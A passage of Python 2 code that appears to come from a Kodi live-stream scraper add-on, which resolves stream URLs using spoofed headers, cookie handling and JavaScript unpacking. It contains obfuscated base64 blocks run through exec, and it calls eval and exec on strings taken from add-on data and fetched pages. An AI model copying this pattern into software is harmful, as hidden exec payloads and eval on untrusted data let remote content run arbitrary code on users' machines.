MTV8ZGJ8ZTd8YTJ8N2J8N2N8MTh8MTd8YWR8MTl8MWN8MzZ8MWV8MWJ8MjJ8YzN8Mjd8YzR8MjN8ZDR8OGR8OTJ8MjR8MjZ8MjV8ZGR8MmF8MmN8MmR8MmV8YjJ8Mzl8MmZ8MzB8MzF8MzJ8MzR8MzV8Mzd8Mzh8M2F8M2J8M2R8M2V8M2Z8ZDV8NDF8NDJ8NDN8OTl8NGF8NDV8NTJ8YTF8OWJ8OWN8NTN8OWR8NTZ8NDh8NGJ8NGN8YWJ8YTR8YTN8NGV8NDZ8ZTJ8NDl8NTB8NTF8NzJ8NTV8NTh8NTl8Njh8NWJ8NTd8NWN8NWV8NWZ8NjB8NjJ8NjN8NjR8NWF8NWR8NjV8Njl8NmJ8NmN8NmR8NmV8NjF8NzB8NzF8YjF8ZTF8NzN8NzZ8NzR8N2Z8Nzd8ZDB8ODR8YjV8N2F8Yjd8N2R8N2V8YmJ8ODB8ODJ8YmR8YzZ8ODV8ODN8ODZ8ODd8ODh8OGF8OGZ8OGV8OTB8OGJ8OTF8OTN8OTV8OGN8OTd8MTF8ZDd8YWZ8YTh8ZDN8YTB8ZDJ8MWR8OWZ8YTZ8YTd8YTl8YWF8YWN8Y2R8MzN8N3xiMHxiZnxiNHxiY3xiOXxjMHxiYXxjMXxlNHxjZXw3OHxkZXxkNnxkYXxjY3xkY3xkZnxkMXw1NHxjN3xjYXxhNXwxZnxiOHxlNXw3OSIuOTYoInwiKSkp|MDoKCQkJCQkxZCAxMyAxYiAzKCc0ZCcpOgoJCQkJCQk3OCAxZiAxMy4yOSA9PSA1OgoJCQkJCQkJNzggJzdiOi8vJyAxYiAxMzoKCQkJCQkJCQk3YiA9ICdkMzovL2QzLmMuNGQtNjMvPzQ9JysxMy4yOSArJyYyNTsyMj0yJjI1OycgKyAnOT0nKzkgCgkJCQkJCQkJNC5kMCg3YikgCgkJCQkJCQliOgoJCQkJCQkJCTRkPSdkMzovL2QzLmMuNGQtNjMvPzQ9JysxMy4yOSArJyYyNTsyMj0xJjI1OycgKyAnOT0nKzkgCgkJCQkJCQkJNC5kMCg0ZCkKCQkJCWQgMWUoMygnNDInKSkgPjA6CgkJCQkJMWQgMTMgMWIgMygnNDInKToKCQkJCQkJNzggMWYgMTMuMjkgPT0gNToKCQkJCQkJCTQyID0gJ2QzOi8vZDMuOWUuNzcuYzcvPzIyPTYwJjI1OzkxPScrMTMuMjkKCQkJCQkJCTQuZDAoNDIpCgkJCQlkIDFlKDMoJzJlJykpID4wOgoJCQkJCTFkIDEzIDFiIDMoJzJlJyk6CgkJCQkJCTc4IDFmIDEzLjI5ID09IDU6CgkJCQkJCQk3OCAxZiAnNTgnIDFiIDEzLjI5OgoJCQkJCQkJCTJlID0gJ2QzOi8vZDMuYy5hNS4yZS8|T|IDEwOgoJCSAgIGM9YysxOyAyYi4zZSgxMDUrICcgNzcgWycrMzYoYykrJ10nKTsgMzEuM2UoMTQpCiAKCTkgYz09MToKCQkxMDI6CgkJCSNiICc2OSAxICAgNzg6JyArIDEwNSArICcgICAxMTonICsgMzFbMF0gKyAnCSAnICsgMzYoYykKCQkJM2M9MjkuNjQoMTA1LCA1YT0xNywzNT0xNyk7IDNjLjcwKCA0ZD0iOTAiLCA0Nz17ICI4ZCI6IDEwNSB9ICkKCQkJYmQ9NGUuMmMoN2I9OTUoYjUuOWFbMV0pLDExPTMxWzBdLDY1PTNjKQoJCQk0OC43ZSgpLjY5KDVlKDMxWzBdKSwgM2MpCgkJNDoKCQkJNGIKCTFkOgoJCSA3NT0yOS43ZCgpCgkJIDk0PTc1LmMzKCcxOSBiYyAxMDMgNzcnLCAyYikKCQkgOSA5ND49MDoKCQkJIGNmPTEwNQoJCQkgNjE9MzYoMzFbOTRdKQoJCQkgI2IgJzlkICAgNzg6JyArIDEwNSArICcgICAxMTonICsgNjEKCQkJIDEwMjoKCQkJCSAzYz0yOS42NCgxMDUsIDVhPTE3LDM1PTE3KTsgM2MuNzAoIDRkPSI5MCIsIDQ3PXsgIjhkIjogMTA1IH0gKQoJCQkJIGJkPTRlLjJjKDdiPTk1KGI1LjlhWzFdKSwxMT02MSw2NT0zYykKCQkJCSA0OC43ZSgpLjY5KDVlKDYxKSwgM2MpCgkJCSA0OgoJCQkJIDRiCgoJCQkJCjVkIDZkKCk6CiM3MSBkNgoJZWQgPSAnNzggZjYgNmEgZTYgZjkgZDAnCglmID0gJycKCTJkID0gNDguOWYoZiwgZWQpCgkyZC5iMCgpCgk5IDJkLjgxKCk6CgkgICBmID0gMmQuYjIoKS40MygnXGVlJywnJykuOGUoKQoJICAgOSAyYShmKSA9PSAwOiAKCQkgIDI5LjdkKCkuYmQoJzE5JywgJ2IxIGFhJykKCQkgIDc5CSAgIAoJCglmID0gZi45MigpCgkyYj1bXQoJMmIuM2UoYzYpCgkxZiA9IDAKCTEzID0gMSAKCTkzID0gMAoJMjAgPSAwCgkyMyA9IDI5LjZlKCkKCTIzLmM0KCcxOSA5NyBiYiBlNScsJyAnKQoJCgljOSAxMyA8PiA5MzoKCQkzMiA9IDJiWzkzXS44ZSgpCgkJYiAnZTkgZTggZjMgN2EgZTIgZGMgKCcgKyAzNig5MykgKyAnKScgIAoJCTkzID0gOTMgKyAxCgoJCTcgPSAnJwoJCTEwMjoKCQkJNyA9IGY0LmE1KDMyKS40NgoJCQk3ID0gNy4xNignODgnLCAnMzMnKS41YygnODgnKQoJCQkjOWUuOTEoMSkKCQk0OiAKCQkJNGIKCQkKCQk5IDJhKDcpIDwgMTA6CgkJCTcgPSAnJwoJCQkxZiA9IDFmICsgMQoJCQliICcqKiogYzIgKioqKicgKyAzMiArICcgICoqKioqKioqKioqKiogY2EgYmUgZDg6ICcgKyAzNigxZikKCQkJOWUuOTEoLjUpCiAKCQk3MiA9IDk1KCAoIDkzIC8gZjEpICogMTAwKSAKCQk3MyA9ICcJIGQyIGUxOiAnKzM2KDkzKSsnCQlhOSA4NTogJyArIDM2KDIwKQoJCTIzLmM3KDcyLCIiLCA3MywgIiIgKQoKCQk5IDIzLjhmKCk6CgkJICAgNzkKIAkJCgkJOSAyYSg3KSA|x".split("|")))
def parse_regex(reg_item):
                try:
                    regexs = {}
                    for i in reg_item:
                        regexs[i('name')[0].string] = {}
                        #regexs[i('name')[0].string]['expre'] = i('expres')[0].string
                        try:
                            regexs[i('name')[0].string]['expre'] = i('expres')[0].string
                            if not regexs[i('name')[0].string]['expre']:
                                regexs[i('name')[0].string]['expre']=''
                        except:
                            addon_log("Regex: -- No Referer --")
                        regexs[i('name')[0].string]['page'] = i('page')[0].string
                        try:
                            regexs[i('name')[0].string]['refer'] = i('referer')[0].string
                        except:
                            addon_log("Regex: -- No Referer --")
                        try:
                            regexs[i('name')[0].string]['connection'] = i('connection')[0].string
                        except:
                            addon_log("Regex: -- No connection --")

                        try:
                            regexs[i('name')[0].string]['notplayable'] = i('notplayable')[0].string
                        except:
                            addon_log("Regex: -- No notplayable --")
                            
                        try:
                            regexs[i('name')[0].string]['noredirect'] = i('noredirect')[0].string
                        except:
                            addon_log("Regex: -- No noredirect --")
                        try:
                            regexs[i('name')[0].string]['origin'] = i('origin')[0].string
                        except:
                            addon_log("Regex: -- No origin --")
                        try:
                            regexs[i('name')[0].string]['includeheaders'] = i('includeheaders')[0].string
                        except:
                            addon_log("Regex: -- No includeheaders --")                            
                            
                        try:
                            regexs[i('name')[0].string]['x-req'] = i('x-req')[0].string
                        except:
                            addon_log("Regex: -- No x-req --")
                        try:
                            regexs[i('name')[0].string]['x-forward'] = i('x-forward')[0].string
                        except:
                            addon_log("Regex: -- No x-forward --")

                        try:
                            regexs[i('name')[0].string]['agent'] = i('agent')[0].string
                        except:
                            addon_log("Regex: -- No User Agent --")
                        try:
                            regexs[i('name')[0].string]['post'] = i('post')[0].string
                        except:
                            addon_log("Regex: -- Not a post")
                        try:
                            regexs[i('name')[0].string]['rawpost'] = i('rawpost')[0].string
                        except:
                            addon_log("Regex: -- Not a rawpost")
                        try:
                            regexs[i('name')[0].string]['htmlunescape'] = i('htmlunescape')[0].string
                        except:
                            addon_log("Regex: -- Not a htmlunescape")


                        try:
                            regexs[i('name')[0].string]['readcookieonly'] = i('readcookieonly')[0].string
                        except:
                            addon_log("Regex: -- Not a readCookieOnly")
                        #print i
                        try:
                            regexs[i('name')[0].string]['cookiejar'] = i('cookiejar')[0].string
                            if not regexs[i('name')[0].string]['cookiejar']:
                                regexs[i('name')[0].string]['cookiejar']=''
                        except:
                            addon_log("Regex: -- Not a cookieJar")							
                        try:
                            regexs[i('name')[0].string]['setcookie'] = i('setcookie')[0].string
                        except:
                            addon_log("Regex: -- Not a setcookie")
                        try:
                            regexs[i('name')[0].string]['appendcookie'] = i('appendcookie')[0].string
                        except:
                            addon_log("Regex: -- Not a appendcookie")
                                                    
                        try:
                            regexs[i('name')[0].string]['ignorecache'] = i('ignorecache')[0].string
                        except:
                            addon_log("Regex: -- no ignorecache")
                        #try:
                        #    regexs[i('name')[0].string]['ignorecache'] = i('ignorecache')[0].string
                        #except:
                        #    addon_log("Regex: -- no ignorecache")			

                    regexs = urllib.quote(repr(regexs))
                    return regexs
                    #print regexs
                except:
                    regexs = None
                    addon_log('regex Error: '+name.encode('utf-8', 'ignore'))
#copies from lamda's implementation
def get_ustream(url):
    try:
        for i in range(1, 51):
            result = getUrl(url)
            if "EXT-X-STREAM-INF" in result: return url
            if not "EXTM3U" in result: return
            xbmc.sleep(2000)
        return
    except:
        return
        
 
def getRegexParsed(regexs, url,cookieJar=None,forCookieJarOnly=False,recursiveCall=False,cachedPages={}, rawPost=False, cookie_jar_file=None):#0,1,2 = URL, regexOnly, CookieJarOnly
        if not recursiveCall:
            regexs = eval(urllib.unquote(regexs))
        #cachedPages = {}
        #print 'url',url
        doRegexs = re.compile('\$doregex\[([^\]]*)\]').findall(url)
        #print 'doRegexs',doRegexs,regexs
        setresolved=True
              
 


        for k in doRegexs:
            if k in regexs:
                #print 'processing ' ,k
                m = regexs[k]
                #print m
                cookieJarParam=False


                if  'cookiejar' in m: # so either create or reuse existing jar
                    #print 'cookiejar exists',m['cookiejar']
                    cookieJarParam=m['cookiejar']
                    if  '$doregex' in cookieJarParam:
                        cookieJar=getRegexParsed(regexs, m['cookiejar'],cookieJar,True, True,cachedPages)
                        cookieJarParam=True
                    else:
                        cookieJarParam=True
                #print 'm[cookiejar]',m['cookiejar'],cookieJar
                if cookieJarParam:
                    if cookieJar==None:
                        #print 'create cookie jar'
                        cookie_jar_file=None
                        if 'open[' in m['cookiejar']:
                            cookie_jar_file=m['cookiejar'].split('open[')[1].split(']')[0]
                            
                        cookieJar=getCookieJar(cookie_jar_file)
                        if cookie_jar_file:
                            saveCookieJar(cookieJar,cookie_jar_file)
                        #import cookielib
                        #cookieJar = cookielib.LWPCookieJar()
                        #print 'cookieJar new',cookieJar
                    elif 'save[' in m['cookiejar']:
                        cookie_jar_file=m['cookiejar'].split('save[')[1].split(']')[0]
                        complete_path=os.path.join(profile,cookie_jar_file)
                        print 'complete_path',complete_path
                        saveCookieJar(cookieJar,cookie_jar_file)
                        
 
                if  m['page'] and '$doregex' in m['page']:
                    m['page']=getRegexParsed(regexs, m['page'],cookieJar,recursiveCall=True,cachedPages=cachedPages)

                if 'setcookie' in m and m['setcookie'] and '$doregex' in m['setcookie']:
                    m['setcookie']=getRegexParsed(regexs, m['setcookie'],cookieJar,recursiveCall=True,cachedPages=cachedPages)
                if 'appendcookie' in m and m['appendcookie'] and '$doregex' in m['appendcookie']:
                    m['appendcookie']=getRegexParsed(regexs, m['appendcookie'],cookieJar,recursiveCall=True,cachedPages=cachedPages)

                 
                if  'post' in m and '$doregex' in m['post']:
                    m['post']=getRegexParsed(regexs, m['post'],cookieJar,recursiveCall=True,cachedPages=cachedPages)
                    print 'post is now',m['post']

                if  'rawpost' in m and '$doregex' in m['rawpost']:
                    m['rawpost']=getRegexParsed(regexs, m['rawpost'],cookieJar,recursiveCall=True,cachedPages=cachedPages,rawPost=True)
                    #print 'rawpost is now',m['rawpost']
  
                if 'rawpost' in m and '$epoctime$' in m['rawpost']:
                    m['rawpost']=m['rawpost'].replace('$epoctime$',getEpocTime())
  
                if 'rawpost' in m and '$epoctime2$' in m['rawpost']:
                    m['rawpost']=m['rawpost'].replace('$epoctime2$',getEpocTime2())

  
                link=''
                if m['page'] and m['page'] in cachedPages and not 'ignorecache' in m and forCookieJarOnly==False :
                    link = cachedPages[m['page']]
                else:
                    if m['page'] and  not m['page']=='' and  m['page'].startswith('http'):
                        if '$epoctime$' in m['page']:
                            m['page']=m['page'].replace('$epoctime$',getEpocTime())
                        if '$epoctime2$' in m['page']:
                            m['page']=m['page'].replace('$epoctime2$',getEpocTime2())

                        #print 'Ingoring Cache',m['page']
                        page_split=m['page'].split('|')
                        pageUrl=page_split[0]
                        header_in_page=None
                        if len(page_split)>1:
                            header_in_page=page_split[1]
                        req = urllib2.Request(pageUrl)
                        req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20100101 Firefox/14.0.1')
                        if 'refer' in m:
                            req.add_header('Referer', m['refer'])
                        if 'agent' in m:
                            req.add_header('User-agent', m['agent'])
                        if 'x-req' in m:
                            req.add_header('X-Requested-With', m['x-req'])
                        if 'x-forward' in m:
                            req.add_header('X-Forwarded-For', m['x-forward'])
                        if 'setcookie' in m:
                            print 'adding cookie',m['setcookie']
                            req.add_header('Cookie', m['setcookie'])
                        if 'appendcookie' in m:
                            print 'appending cookie to cookiejar',m['appendcookie']
                            cookiestoApend=m['appendcookie']
                            cookiestoApend=cookiestoApend.split(';')
                            for h in cookiestoApend:
                                n,v=h.split('=')
                                w,n= n.split(':')
                                ck = cookielib.Cookie(version=0, name=n, value=v, port=None, port_specified=False, domain=w, domain_specified=False, domain_initial_dot=False, path='/', path_specified=True, secure=False, expires=None, discard=True, comment=None, comment_url=None, rest={'HttpOnly': None}, rfc2109=False)
                                cookieJar.set_cookie(ck)

                                

                            
                        if 'origin' in m:
                            req.add_header('Origin', m['origin'])
                        if header_in_page:
                            header_in_page=header_in_page.split('&')
                            for h in header_in_page:
                                n,v=h.split('=')
                                req.add_header(n,v)


                        if not cookieJar==None:
                            #print 'cookieJarVal',cookieJar
                            cookie_handler = urllib2.HTTPCookieProcessor(cookieJar)
                            opener = urllib2.build_opener(cookie_handler, urllib2.HTTPBasicAuthHandler(), urllib2.HTTPHandler())
                            opener = urllib2.install_opener(opener)
                            if 'noredirect' in m:
                                opener2 = urllib2.build_opener(NoRedirection)
                                opener = urllib2.install_opener(opener2)
                                
                        if 'connection' in m:
                            print '..........................connection//////.',m['connection']
                            from keepalive import HTTPHandler
                            keepalive_handler = HTTPHandler()
                            opener = urllib2.build_opener(keepalive_handler)
                            urllib2.install_opener(opener)
                            
                        #print 'after cookie jar'
                        post=None

                        if 'post' in m:
                            postData=m['post']
                            if '$LiveStreamRecaptcha' in postData:
                                (captcha_challenge,catpcha_word)=processRecaptcha(m['page'])
                                if captcha_challenge:
                                    postData+='recaptcha_challenge_field:'+captcha_challenge+',recaptcha_response_field:'+catpcha_word
                            splitpost=postData.split(',');
                            post={}
                            for p in splitpost:
                                n=p.split(':')[0];
                                v=p.split(':')[1];
                                post[n]=v
                            post = urllib.urlencode(post)

                        if 'rawpost' in m:
                            post=m['rawpost']
                            if '$LiveStreamRecaptcha' in post:
                                (captcha_challenge,catpcha_word)=processRecaptcha(m['page'])
                                if captcha_challenge:
                                   post+='&recaptcha_challenge_field='+captcha_challenge+'&recaptcha_response_field='+catpcha_word


                            

                        if post:
                            response = urllib2.urlopen(req,post)
                        else:
                            response = urllib2.urlopen(req)

                        link = response.read()
                        link=javascriptUnEscape(link)
                        #print link This just print whole webpage in LOG
                        if 'includeheaders' in m:
                            link+=str(response.headers.get('Set-Cookie'))

                        response.close()
                        cachedPages[m['page']] = link
                        #print link
                        #print 'store link for',m['page'],forCookieJarOnly
                        
                        if forCookieJarOnly:
                            return cookieJar# do nothing
                    elif m['page'] and  not m['page'].startswith('http'):
                        if m['page'].startswith('$pyFunction:'):
                            val=doEval(m['page'].split('$pyFunction:')[1],'',cookieJar )
                            if forCookieJarOnly:
                                return cookieJar# do nothing
                            link=val
                        else:
                            link=m['page']
                if '$pyFunction:playmedia(' in m['expre'] or 'ActivateWindow'  in m['expre']   or  any(x in url for x in g_ignoreSetResolved):
                    setresolved=False
                if  '$doregex' in m['expre']:
                    m['expre']=getRegexParsed(regexs, m['expre'],cookieJar,recursiveCall=True,cachedPages=cachedPages)
                    
                
                if not m['expre']=='':
                    print 'doing it ',m['expre']
                    if '$LiveStreamCaptcha' in m['expre']:
                        val=askCaptcha(m,link,cookieJar)
                        #print 'url and val',url,val
                        url = url.replace("$doregex[" + k + "]", val)
                    elif m['expre'].startswith('$pyFunction:'):
                        #print 'expeeeeeeeeeeeeeeeeeee',m['expre']
                        val=doEval(m['expre'].split('$pyFunction:')[1],link,cookieJar )
                        if 'ActivateWindow' in m['expre']: return 
                        print 'still hre'
                        print 'url k val',url,k,val

                        url = url.replace("$doregex[" + k + "]", val)
                    else:
                        if not link=='':
                            reg = re.compile(m['expre']).search(link)
                            val=''
                            try:
                                val=reg.group(1).strip()
                            except: traceback.print_exc()
                        else:
                            val=m['expre']
                        if rawPost:
                            print 'rawpost'
                            val=urllib.quote_plus(val)
                        if 'htmlunescape' in m:
                            #val=urllib.unquote_plus(val)
                            import HTMLParser
                            val=HTMLParser.HTMLParser().unescape(val)                     
                        url = url.replace("$doregex[" + k + "]", val)
                        #return val
                else:           
                    url = url.replace("$doregex[" + k + "]",'')
        if '$epoctime$' in url:
            url=url.replace('$epoctime$',getEpocTime())
        if '$epoctime2$' in url:
            url=url.replace('$epoctime2$',getEpocTime2())

        if '$GUID$' in url:
            import uuid
            url=url.replace('$GUID$',str(uuid.uuid1()).upper())
        if '$get_cookies$' in url:
            url=url.replace('$get_cookies$',getCookiesString(cookieJar))   

        if recursiveCall: return url
        print 'final url',url
        if url=="": 
        	return
        else:
        	return url,setresolved

            
        
exec("import re;import base64");exec((lambda p,y:(lambda o,b,f:re.sub(o,b,f))(r"([0-9a-f]+)",lambda m:p(m,y),base64.b64decode("MTYgNDEoNjMpOgoJMjMgMTcKCTVlPTE3LjViKCkKCTVlLjQ1KDYzKQoJNjYgNWUuMmEoKQoKMTYgM2YoMTIpOgoJNDM9IiIKCTQyIDNkIDNiIDEyLjRkKCc6Jyk6CgkJNDMrPTU3KDY1KDNkLjM2KCI1YSIsIiIpKS82MS81KQoJNjYgNDMKCjE2IDJjKDYpOgoJNWM6CgkJMjMgIDgKCQkxMSA9IDguMjQoKQoJCTE0ID0gMzcuMTMoIDRiID0gMTUoNTEpLCAyZSA9ICIyMC41OCIsIDE4ID0gMWQuMWYoICIxMy40NyIgKSwgNTM9NiApCgkJMTEuNTQoIDYsMTQpCgkJMWQuMjYoNTYpCgkJNDYgMTEuMjk6CgkJCTFkLjI2KDYwKQoJNDQ6CgkJMmQuMmIoKQoJNjYgJycKCQoJCQoxNiAxZSg2NCwgMT0zMCk6CgkyMSAxOgoJCTE9WygnMWInLDEpXQoJMjEgNjQuMzkoIjM0Iik6CgkJND02NAoJCTY0PSAzMSg2NCw5PTEpCgoJMj0iKDU1XCgzMlwoNjksYSxjLDY4LGUsKD86NDl8ZCkuKikiCgoJMz00ZS4xYSgyKS4xOSg2NCkKCTQ5PSIiCgkyMSAzIDU5IDVkKDMpPjA6CgkJNDIgNGYgM2IgMzoKCQkJMjc9MjIoNGYpCgkJCTUwPTQ4KDI3LCdcJyguKj8pXCcnKQoJCQkyMSAnMzMnIDNiIDI3OgoJCQkJMjc9M2MuMzUoNTApCgkJCTQ5Kz0yNysnXDY3JwoJCTI4ICc0YSA0YyA2MiAnLDQ5CgkJCgkJND00OCg0OSwnNWY9IiguKj8pIicpCgkJCgkJNjQ9IDMxKDQsOT0xKQoKCSMyOCA2NAoKCTI1PTQ4KDY0LCcyZlwnLio/XCcoLio/KVwnXCknKQoJNz00OCg2NCwnNTJcJyxcNDBcJyguKj8pXCcnKQoKCQoJNjYgMjUrJyA3PScrNyArJyAzOD0nKzQKCQoxNiAxYyg2NCwgMT0zMCk6CgkyMSAxOgoJCTE9WygnMWInLDEpXQoJMjEgNjQuMzkoIjM0Iik6CgkJNjQ9IDMxKDY0LDk9MSkKCTI9IjEwIGEgPSAoLio/KTtcNDAqMTAgYiA9ICguKj8pO1w0MCoxMCBjID0gKC4qPyk7XDQwKjEwIGQgPSAoLio/KTtcNDAqMTAgZiA9ICguKj8pO1w0MCoxMCAzYSA9ICcoLio/KSc7IgoJMz00ZS4xYSgyKS4xOSg2NClbMF0gCgoJYSxiLGMsZCxmLDRmPSgzKQoJZj02NShmKQoJYT02NShhKS9mCgliPTY1KGIpL2YKCWM9NjUoYykvZgoJZD02NShkKS9mCgoJM2U9ICcyNTovLycgKyAxNShhKSArICcuJyArIDE1KGIpICsgJy4nICsgMTUoYykgKyAnLicgKyAxNShkKSArIDRmOwoJNjYgM2U=")))(lambda a,b:b[int("0x"+a.group(1),16)],"0|referer|str_pattern|reg_res|page_url|5|media_url|playpath|CustomPlayer|headers|a|b|c|d|e|f|var|player|encrypted|ListItem|listitem|str|def|hashlib|thumbnailImage|findall|compile|Referer|get_leton_rtmp|xbmc|get_saw_rtmp|getInfoImage|DefaultVideo|if|get_unpacked|import|MyXBMCPlayer|rtmp|sleep|r1|print|is_active|hexdigest|print_exc|playmedia|traceback|iconImage|streamer|None|getUrl|function|unescape|http|unquote|replace|xbmcgui|pageUrl|startswith|v_part|in|urllib|val|ret|decrypt_vaughnlive|s|getmd5|for|retVal|except|update|while|Thumb|re_me|r|final|label|value|split|re|v|r2|name|file|path|play|eval|1000|chr|png|and|0m0|md5|try|len|h|src|200|84|is|t|page_value|int|return|n|k|p".split("|")))

def createM3uForDash(url,useragent=None):
    str='#EXTM3U'
    str+='\n#EXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=361816'
    str+='\n'+url+'&bytes=0-200000'#+'|User-Agent='+useragent
    source_file = os.path.join(profile, 'testfile.m3u')
    str+='\n'
    SaveToFile(source_file,str)
    #return 'C:/Users/shani/Downloads/test.m3u8'
    return source_file

def SaveToFile(file_name,page_data,append=False):
    if append:
        f = open(file_name, 'a')
        f.write(page_data)
        f.close()        
    else:
        f=open(file_name,'wb')
        f.write(page_data)
        f.close()
        return ''
    
def LoadFile(file_name):
	f=open(file_name,'rb')
	d=f.read()
	f.close()
	return d
    
def get_packed_iphonetv_url(page_data):
	import re,base64,urllib; 
	s=page_data
	while 'geh(' in s:
		if s.startswith('lol('): s=s[5:-1]    
#		print 's is ',s
		s=re.compile('"(.*?)"').findall(s)[0]; 
		s=  base64.b64decode(s); 
		s=urllib.unquote(s); 
	print s
	return s

def get_ferrari_url(page_data):
    print 'get_dag_url2',page_data
    page_data2=getUrl(page_data);
    patt='(http.*)'
    import uuid
    playback=str(uuid.uuid1()).upper()
    links=re.compile(patt).findall(page_data2)
    headers=[('X-Playback-Session-Id',playback)]
    for l in links:
        try:
                page_datatemp=getUrl(l,headers=headers);
                    
        except: pass
    
    return page_data+'|&X-Playback-Session-Id='+playback

    
def get_dag_url(page_data):
    print 'get_dag_url',page_data
    if page_data.startswith('http://dag.total-stream.net'):
        headers=[('User-Agent','Verismo-BlackUI_(2.4.7.5.8.0.34)')]
        page_data=getUrl(page_data,headers=headers);

    if '127.0.0.1' in page_data:
        return revist_dag(page_data)
    elif re_me(page_data, 'wmsAuthSign%3D([^%&]+)') != '':
        final_url = re_me(page_data, '&ver_t=([^&]+)&') + '?wmsAuthSign=' + re_me(page_data, 'wmsAuthSign%3D([^%&]+)') + '==/mp4:' + re_me(page_data, '\\?y=([^&]+)&')
    else:
        final_url = re_me(page_data, 'href="([^"]+)"[^"]+$')
        if len(final_url)==0:
            final_url=page_data
    final_url = final_url.replace(' ', '%20')
    return final_url

def re_me(data, re_patten):
    match = ''
    m = re.search(re_patten, data)
    if m != None:
        match = m.group(1)
    else:
        match = ''
    return match

def revist_dag(page_data):
    final_url = ''
    if '127.0.0.1' in page_data:
        final_url = re_me(page_data, '&ver_t=([^&]+)&') + ' live=true timeout=15 playpath=' + re_me(page_data, '\\?y=([a-zA-Z0-9-_\\.@]+)')
        
    if re_me(page_data, 'token=([^&]+)&') != '':
        final_url = final_url + '?token=' + re_me(page_data, 'token=([^&]+)&')
    elif re_me(page_data, 'wmsAuthSign%3D([^%&]+)') != '':
        final_url = re_me(page_data, '&ver_t=([^&]+)&') + '?wmsAuthSign=' + re_me(page_data, 'wmsAuthSign%3D([^%&]+)') + '==/mp4:' + re_me(page_data, '\\?y=([^&]+)&')
    else:
        final_url = re_me(page_data, 'HREF="([^"]+)"')

    if 'dag1.asx' in final_url:
        return get_dag_url(final_url)

    if 'devinlivefs.fplive.net' not in final_url:
        final_url = final_url.replace('devinlive', 'flive')
    if 'permlivefs.fplive.net' not in final_url:
        final_url = final_url.replace('permlive', 'flive')
    return final_url


def get_unwise( str_eval):
    page_value=""
    try:        
        ss="w,i,s,e=("+str_eval+')' 
        exec (ss)
        page_value=unwise_func(w,i,s,e)
    except: traceback.print_exc(file=sys.stdout)
    #print 'unpacked',page_value
    return page_value
    
def unwise_func( w, i, s, e):
    lIll = 0;
    ll1I = 0;
    Il1l = 0;
    ll1l = [];
    l1lI = [];
    while True:
        if (lIll < 5):
            l1lI.append(w[lIll])
        elif (lIll < len(w)):
            ll1l.append(w[lIll]);
        lIll+=1;
        if (ll1I < 5):
            l1lI.append(i[ll1I])
        elif (ll1I < len(i)):
            ll1l.append(i[ll1I])
        ll1I+=1;
        if (Il1l < 5):
            l1lI.append(s[Il1l])
        elif (Il1l < len(s)):
            ll1l.append(s[Il1l]);
        Il1l+=1;
        if (len(w) + len(i) + len(s) + len(e) == len(ll1l) + len(l1lI) + len(e)):
            break;
        
    lI1l = ''.join(ll1l)#.join('');
    I1lI = ''.join(l1lI)#.join('');
    ll1I = 0;
    l1ll = [];
    for lIll in range(0,len(ll1l),2):
        #print 'array i',lIll,len(ll1l)
        ll11 = -1;
        if ( ord(I1lI[ll1I]) % 2):
            ll11 = 1;
        #print 'val is ', lI1l[lIll: lIll+2]
        l1ll.append(chr(    int(lI1l[lIll: lIll+2], 36) - ll11));
        ll1I+=1;
        if (ll1I >= len(l1lI)):
            ll1I = 0;
    ret=''.join(l1ll)
    if 'eval(function(w,i,s,e)' in ret:
        print 'STILL GOing'
        ret=re.compile('eval\(function\(w,i,s,e\).*}\((.*?)\)').findall(ret)[0] 
        return get_unwise(ret)
    else:
        print 'FINISHED'
        return ret
    
def get_unpacked( page_value, regex_for_text='', iterations=1, total_iteration=1):
    try:        
        reg_data=None
        if page_value.startswith("http"):
            page_value= getUrl(page_value)
        print 'page_value',page_value
        if regex_for_text and len(regex_for_text)>0:
            page_value=re.compile(regex_for_text).findall(page_value)[0] #get the js variable
        
        page_value=unpack(page_value,iterations,total_iteration)
    except: traceback.print_exc(file=sys.stdout)
    print 'unpacked',page_value
    if 'sav1live.tv' in page_value:
        page_value=page_value.replace('sav1live.tv','sawlive.tv') #quick fix some bug somewhere
        print 'sav1 unpacked',page_value
    return page_value

def unpack(sJavascript,iteration=1, totaliterations=2  ):
    print 'iteration',iteration
    if sJavascript.startswith('var _0xcb8a='):
        aSplit=sJavascript.split('var _0xcb8a=')
        ss="myarray="+aSplit[1].split("eval(")[0]
        exec(ss)
        a1=62
        c1=int(aSplit[1].split(",62,")[1].split(',')[0])
        p1=myarray[0]
        k1=myarray[3]
        with open('temp file'+str(iteration)+'.js', "wb") as filewriter:
            filewriter.write(str(k1))
        #aa=1/0
    else:

        aSplit = sJavascript.split("rn p}('")
        print aSplit
        
        p1,a1,c1,k1=('','0','0','')
     
        ss="p1,a1,c1,k1=('"+aSplit[1].split(".spli")[0]+')' 
        exec(ss)
    k1=k1.split('|')
    aSplit = aSplit[1].split("))'")
#    print ' p array is ',len(aSplit)
#   print len(aSplit )

    #p=str(aSplit[0]+'))')#.replace("\\","")#.replace('\\\\','\\')

    #print aSplit[1]
    #aSplit = aSplit[1].split(",")
    #print aSplit[0] 
    #a = int(aSplit[1])
    #c = int(aSplit[2])
    #k = aSplit[3].split(".")[0].replace("'", '').split('|')
    #a=int(a)
    #c=int(c)
    
    #p=p.replace('\\', '')
#    print 'p val is ',p[0:100],'............',p[-100:],len(p)
#    print 'p1 val is ',p1[0:100],'............',p1[-100:],len(p1)
    
    #print a,a1
    #print c,a1
    #print 'k val is ',k[-10:],len(k)
#    print 'k1 val is ',k1[-10:],len(k1)
    e = ''
    d = ''#32823

    #sUnpacked = str(__unpack(p, a, c, k, e, d))
    sUnpacked1 = str(__unpack(p1, a1, c1, k1, e, d,iteration))
    
    #print sUnpacked[:200]+'....'+sUnpacked[-100:], len(sUnpacked)
#    print sUnpacked1[:200]+'....'+sUnpacked1[-100:], len(sUnpacked1)
    
    #exec('sUnpacked1="'+sUnpacked1+'"')
    if iteration>=totaliterations:
#        print 'final res',sUnpacked1[:200]+'....'+sUnpacked1[-100:], len(sUnpacked1)
        return sUnpacked1#.replace('\\\\', '\\')
    else:
#        print 'final res for this iteration is',iteration
        return unpack(sUnpacked1,iteration+1)#.replace('\\', ''),iteration)#.replace('\\', '');#unpack(sUnpacked.replace('\\', ''))

def __unpack(p, a, c, k, e, d, iteration,v=1):

    #with open('before file'+str(iteration)+'.js', "wb") as filewriter:
    #    filewriter.write(str(p))
    while (c >= 1):
        c = c -1
        if (k[c]):
            aa=str(__itoaNew(c, a))
            if v==1:
                p=re.sub('\\b' + aa +'\\b', k[c], p)# THIS IS Bloody slow!
            else:
